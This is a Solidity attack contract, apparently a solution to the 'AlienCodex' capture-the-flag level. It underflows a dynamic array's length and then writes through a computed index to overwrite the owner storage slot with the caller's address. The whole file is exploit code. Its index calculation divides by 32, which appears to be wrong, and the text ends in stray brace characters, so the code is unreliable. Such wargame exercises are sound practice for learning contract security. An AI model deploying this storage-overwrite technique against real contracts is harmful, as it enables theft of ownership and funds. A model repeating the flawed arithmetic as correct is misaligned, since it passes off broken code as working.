pragma solidity ^0.5.0;

interface AlienCodexInterface {
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 content) external;
}

contract AlienCodexCorrectAttack {
    function attack(address instance) public {
        AlienCodexInterface alien = AlienCodexInterface(instance);
        alien.makeContact();
        alien.retract();
        
        // Compute slot of codex array length: slot 1
        uint256 codexSlot = 1;
        bytes32 baseHash = keccak256(abi.encodePacked(codexSlot));
        uint256 i = (uint256(0) - uint256(baseHash)) / 32;
        
        // Overwrite owner's storage slot (0) with attacker's address
        alien.revise(i, bytes32(uint256(msg.sender)));
    }
}},{